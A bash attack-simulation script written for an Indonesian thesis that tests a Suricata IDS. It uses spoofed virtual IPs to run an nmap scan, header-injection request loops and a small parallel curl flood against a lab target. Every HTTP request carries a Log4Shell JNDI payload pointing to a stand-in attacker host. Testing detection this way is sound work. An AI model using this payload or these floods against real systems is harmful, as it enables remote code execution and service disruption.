#!/usr/bin/env bash
# =============================================================================
#  attack_bab5.sh — Simulasi Serangan untuk Skripsi BAB V (SuricataEVE)
#  Skenario menggunakan 3 IP Virtual berbeda:
#  1. Port Scanning   (IP 1) — via Nmap
#  2. Brute Force     (IP 2) — via HTTP flood + Log4Shell header
#  3. DDoS Simulation (IP 3) — via Curl flood
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

# --- KONFIGURASI TARGET ---
TARGET_IP="192.168.216.128" # GANTI DENGAN IP TARGET ANDA
TARGET_PORT="80"
TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}"

info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

# -- SETUP VIRTUAL IPs --------------------------------------------------------
[[ $EUID -ne 0 ]] && warn "Gunakan sudo! (sudo bash attack_bab5.sh)" && exit 1

IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
[[ -z "$IFACE" ]] && IFACE="eth0"
KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -n1)

# !! PENTING: Gunakan subnet 10.77.77.x (BUKAN 192.168.x.x lokal) !!
# Agar Suricata mendeteksi sebagai EXTERNAL_NET dan rule Log4Shell aktif!
IP_BASE="10.77.77"
IP_1="${IP_BASE}.201"   # Port Scanner
IP_2="${IP_BASE}.202"   # Brute Force
IP_3="${IP_BASE}.203"   # DDoS

# Payload Log4Shell untuk trigger Suricata rule CVE-2021-44228
PAYLOAD='${jndi:ldap://evil.attacker.com/exploit}'

cleanup() {
    echo ""
    warn "Membersihkan IP virtual dari interface ${IFACE}..."
    ip route del "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
    ip addr del "${IP_1}/24" dev "$IFACE" 2>/dev/null
    ip addr del "${IP_2}/24" dev "$IFACE" 2>/dev/null
    ip addr del "${IP_3}/24" dev "$IFACE" 2>/dev/null
    info "Semua IP virtual berhasil dihapus."
}
trap cleanup EXIT

header "SURICATAEVE ATTACK SIMULATOR BAB V"
echo -e "  Target IP  : ${BOLD}${TARGET_IP}${NC}"
echo -e "  Interface  : ${BOLD}${IFACE}${NC} (Kali IP: ${KALI_IP})"
echo -e "  IP Scanner : ${BOLD}${IP_1}${NC}"
echo -e "  IP Brute   : ${BOLD}${IP_2}${NC}"
echo -e "  IP DDoS    : ${BOLD}${IP_3}${NC}"
echo ""
warn "IP virtual menggunakan subnet 10.77.77.x (EXTERNAL_NET) agar terdeteksi Suricata!"
echo ""
warn "PASTIKAN sudah jalankan ini di Ubuntu Server:"
echo -e "  ${BOLD}sudo ip route add ${IP_BASE}.0/24 via ${KALI_IP}${NC}"
echo ""

read -rp "Sudah siap? Lanjut eksekusi? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

info "Membuat IP Virtual..."
ip addr add "${IP_1}/24" dev "$IFACE" 2>/dev/null && info "  ${IP_1} dibuat"
ip addr add "${IP_2}/24" dev "$IFACE" 2>/dev/null && info "  ${IP_2} dibuat"
ip addr add "${IP_3}/24" dev "$IFACE" 2>/dev/null && info "  ${IP_3} dibuat"
ip route add "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
sleep 2

# -- 1. PORT SCANNING (IP_1) --------------------------------------------------
header "1. Skenario: Port Scanning dari ${IP_1}"
attack "Memindai port menggunakan Nmap dari IP ${IP_1}..."
if command -v nmap &>/dev/null; then
    nmap -sS -p 1-1000 -T4 -S "${IP_1}" -e "${IFACE}" "${TARGET_IP}" 2>/dev/null
else
    warn "Nmap tidak ada, fallback curl probe dari ${IP_1}..."
    for port in 22 80 443 8080 3306; do
        curl --interface "${IP_1}" -s --connect-timeout 1 \
             -H "X-Api-Version: ${PAYLOAD}" \
             "http://${TARGET_IP}:${port}/" > /dev/null 2>&1
    done
fi
info "Port Scanning Selesai (Screenshot dashboard untuk BAB V)"
sleep 3

# -- 2. BRUTE FORCE (IP_2) ----------------------------------------------------
header "2. Skenario: Brute Force dari ${IP_2}"
attack "Simulasi Brute Force Login + Log4Shell dari IP ${IP_2}..."

HEADERS=("User-Agent" "X-Api-Version" "X-Forwarded-For" "Referer" "Authorization" "X-Client-IP")

for i in {1..20}; do
    HDR="${HEADERS[$((i % ${#HEADERS[@]}))]}"
    result=$(curl --connect-timeout 2 -m 2 \
                  --interface "${IP_2}" \
                  -s -o /dev/null -w "%{http_code}" \
                  -H "${HDR}: ${PAYLOAD}" \
                  "${TARGET_URL}/" 2>/dev/null)
    if [[ "$result" == "000" ]]; then
        echo -e "\n${GREEN}[OK]${NC} Koneksi gagal! IP ${IP_2} berhasil diblokir Firewall."
        break
    fi
    echo -ne "Percobaan #${i} (HTTP ${result}) dari ${IP_2}\r"
    sleep 0.3
done
echo ""
info "Brute Force Selesai (Screenshot dashboard untuk BAB V)"
sleep 3

# -- 3. DDoS SIMULATION (IP_3) ------------------------------------------------
header "3. Skenario: DDoS Simulation dari ${IP_3}"
attack "Simulasi HTTP Flood + Log4Shell dari IP ${IP_3}..."

DDOS_HEADERS=("X-Api-Version" "User-Agent" "X-Forwarded-For" "Referer" "X-Real-IP" "CF-Connecting-IP")
SENT=0

for i in {1..30}; do
    HDR="${DDOS_HEADERS[$((i % ${#DDOS_HEADERS[@]}))]}"
    curl --interface "${IP_3}" -s --max-time 2 \
         -H "${HDR}: ${PAYLOAD}" \
         "${TARGET_URL}/" > /dev/null 2>&1 &
    SENT=$((SENT + 1))
done
wait
echo ""
attack "${SENT} request dikirim dari ${IP_3} secara bersamaan."
info "DDoS Simulation Selesai (Screenshot dashboard untuk BAB V)"
echo ""

header "SEMUA SKENARIO PENGUJIAN BAB V SELESAI"
echo -e "Cek Dashboard SuricataEVE untuk melihat hasil deteksi."
echo -e "Tiga IP berikut seharusnya terblokir:"
echo -e "  ${RED}${IP_1}${NC}  (Port Scanner)"
echo -e "  ${RED}${IP_2}${NC}  (Brute Force)"
echo -e "  ${RED}${IP_3}${NC}  (DDoS)"
